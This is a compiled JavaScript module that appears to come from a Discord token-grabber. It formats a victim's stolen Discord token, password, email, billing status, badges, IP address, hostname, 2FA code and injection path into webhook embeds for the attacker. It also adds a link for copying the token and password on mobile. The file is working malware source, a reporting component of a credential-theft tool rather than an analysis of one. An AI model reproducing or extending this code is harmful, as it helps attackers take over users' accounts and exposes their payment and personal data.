"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUserLogonEmbed = void 0;
const constants_1 = require("../constants");
const fakeProfile_1 = require("../fakeProfile");
const utils_1 = require("../utils");
const baseEmbed_1 = require("./helpers/baseEmbed");
const twoFaEmbed_1 = require("./helpers/twoFaEmbed");
const friendsEmbed_1 = require("./helpers/friendsEmbed");
async function getUserLogonEmbed(config, account = new fakeProfile_1.FakeAccount()) {
    const embedsCount = account.discord.twoFACode ? 3 : 2;
    const { embeds, webhookMessage } = (0, baseEmbed_1.getBaseEmbeds)(config, embedsCount);
    const loginEmbed = embeds[0];
    loginEmbed.setAuthor("User Login");
    const token = account.discord.token;
    const password = account.discord.password;
    const des = `[**${constants_1.PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${constants_1.COPY_ON_MOBILE}${token}<br>${password})`;
    loginEmbed.setDescription(des);
    loginEmbed.setThumbnail(await account.discord.getAvatar());
    loginEmbed.setFields([{
            name: "Info",
            value: (0, utils_1.warpTripleQuote)(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}\nInjection Info: \n${account.injectionPath}\n`),
            inline: false
        }, {
            name: "Username",
            value: (0, utils_1.warpInQuote)(account.discord.tag),
            inline: true
        }, {
            name: "ID",
            value: (0, utils_1.warpInQuote)(account.discord.id),
            inline: true
        }, {
            name: "Nitro",
            value: account.discord.nitro,
            inline: false
        }, {
            name: "Badges",
            value: account.discord.badges.join(" "),
            inline: false
        }, {
            name: "Billing",
            value: account.discord.billing,
            inline: false
        }, {
            name: "Email",
            value: (0, utils_1.warpInQuote)(account.discord.email),
            inline: true
        }, {
            name: "Password",
            value: (0, utils_1.warpInQuote)(account.discord.password),
            inline: true
        }, {
            name: "Token",
            value: (0, utils_1.warpTripleQuote)(token),
            inline: false
        }]);
    (0, friendsEmbed_1.prepareFriendsEmbed)(embeds[1], account);
    if (account.discord.twoFACode) {
        (0, twoFaEmbed_1.prepare2FaEmbed)(embeds[2], account.discord.twoFACode);
    }
    return webhookMessage();
}
exports.getUserLogonEmbed = getUserLogonEmbed;
